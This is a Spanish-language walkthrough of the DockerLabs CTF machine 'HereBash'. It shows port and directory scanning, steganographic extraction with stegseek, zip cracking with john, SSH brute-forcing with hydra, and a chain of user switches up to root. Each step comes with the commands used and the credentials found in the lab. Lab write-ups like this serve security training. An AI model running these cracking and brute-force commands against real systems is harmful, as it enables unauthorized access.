#MAQUINA #DOCKERLABS #MEDIO 
#STEGSEEK #BASH_SCRIPTING
<hr>

# RECONOCIMIENTO

Vamos a resolver **HereBash** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 09:06 CET
Initiating ARP Ping Scan at 09:06
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 09:06, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:06
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 09:06, 0.48s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-03-20 09:06:16 CET for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 09:07 CET
Nmap scan report for rubikcube.dl (172.17.0.2)
Host is up (0.000024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:16:59:41:d2:f1:d4:cf:20:cc:ad:e0:f8:8c:ed:a2 (ECDSA)
|_  256 72:9b:5b:79:74:e8:18:d6:0b:31:2e:99:00:01:b5:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.47 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 09:08 CET
Nmap scan report for rubikcube.dl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds

                                                            


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** Tenemos un directorio **scripts**.

## HTTP (80)

Usamos **gobuster** para enumerar:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,js,txt,png,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10733]
/scripts              (Status: 301) [Size: 310] [--> http://172.17.0.2/scripts/]
/spongebob            (Status: 301) [Size: 312] [--> http://172.17.0.2/spongebob/]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/revolt               (Status: 301) [Size: 309] [--> http://172.17.0.2/revolt/]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================

```

Tenemos dos directorios interesantes : **spongebob** y **revolt**

```bash
gobuster dir -u http://172.17.0.2/spongebob/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/spongebob/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,js,txt,png,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/upload               (Status: 301) [Size: 319] [--> http://172.17.0.2/spongebob/upload/]
/spongebob.html       (Status: 200) [Size: 25537]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================
```

En revolt no parece haber nada.

Tenemos una foto en **upload**, nos la traemos:

```bash
wget "http://172.17.0.2/spongebob/upload/ohnorecallwin.jpg"
```

Vamos a ver si tiene algo con **stegseek** :

```
stegseek extract -sf ohnorecallwin.jpg -wl /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "spongebob"
[i] Original filename: "seguro.zip".
[i] Extracting to "ohnorecallwin.jpg.out".

```

Usamos john :

```bash
zip2john ohnorecallwin.jpg.out > x
ver 1.0 efh 5455 efh 7875 ohnorecallwin.jpg.out/secreto.txt PKZIP Encr: 2b chk, TS_chk, cmplen=23, decmplen=11, crc=3DF4DA21 ts=8387 cs=8387 type=0
                                                                                                                                                                    john x           
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 12 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
chocolate        (ohnorecallwin.jpg.out/secreto.txt)     
1g 0:00:00:00 DONE 2/3 (2025-03-20 09:17) 33.33g/s 2636Kp/s 2636Kc/s 2636KC/s 123456..MATT
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

El contenido:
```bash
 aprendemos
```

# EXPLOTACION

Usamos **hydra** para intentar sacar su contraseña:

   ```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p aprendemos ssh://172.17.0.2 -t 64 -F 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-20 09:48:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 8295455 login tries (l:8295455/p:1), ~129617 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 462.00 tries/min, 462 tries in 00:01h, 8295036 to do in 299:15h, 21 active
[STATUS] 427.33 tries/min, 1282 tries in 00:03h, 8294220 to do in 323:30h, 17 active
[STATUS] 370.71 tries/min, 2595 tries in 00:07h, 8292911 to do in 372:51h, 13 active
[STATUS] 292.47 tries/min, 4387 tries in 00:15h, 8291121 to do in 472:29h, 11 active
[22][ssh] host: 172.17.0.2   login: rosa   password: aprendemos
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-20 10:11:37


```

**usuario : rosa**
**contraseña: aprendemos**

YA ESTAMOS COMO ROSA
# ESCALADA PRIVILEGIOS

Vemos un montón de directorios dentro del directorio **-** y por el script que hay, vemos que alguno tendrá contra, vamos a ver cual :

```bash
rosa@11d358f6ef48:~/-$ cat script.sh 
#!/usr/bin/bash

for i in {1..50}; do
    for j in {1..50}; do
        if [[ -f "./buscaelpass$i/archivo$j" ]] && [[ $(cat "./buscaelpass$i/archivo$j") != "xxxxxx:xxxxxx" ]]; then
            echo "$i$j"
        fi
    done
done
rosa@11d358f6ef48:~/-$ ./script.sh 
3321
rosa@11d358f6ef48:~/-$ cat ./buscaelpass33/archivo21
pedro:ell0c0
```

YA ESTAMOS COMO PEDRO.

Vamos a ver si tenemos archivos que podamos leer:

```bash
pedro@11d358f6ef48:/$ find / -user pedro 2>/dev/null
/var/mail/.pass_juan
pedro@11d358f6ef48:/$ cat /var/mail/.pass_juan
ZWxwcmVzaW9uZXMK
```

YA ESTAMOS COMO JUAN.

Vemos :
```bash
juan@11d358f6ef48:~$ ls -la
total 32
drwxr-x--- 3 juan juan 4096 Jun 17  2024 .
drwxr-xr-x 1 root root 4096 Jun 17  2024 ..
-rw-r--r-- 1 juan juan  220 Jun 17  2024 .bash_logout
-rw-r--r-- 1 juan juan 3791 Jun 17  2024 .bashrc
drwxrwxr-x 3 juan juan 4096 Jun 17  2024 .local
-rw-rw-r-- 1 juan juan  112 Jun 17  2024 .ordenes_nuevas
-rw-r--r-- 1 juan juan  807 Jun 17  2024 .profile
juan@11d358f6ef48:~$ cat .ordenes_nuevas 
Hola soy tu patron y me canse y me fui a casa te dejo mi pass en un lugar a mano consiguelo y acaba el trabajo.

```

Al mirar en la **bashrc**, vemos un alias pass.

**YA ESTAMOS COMO ROOT.**

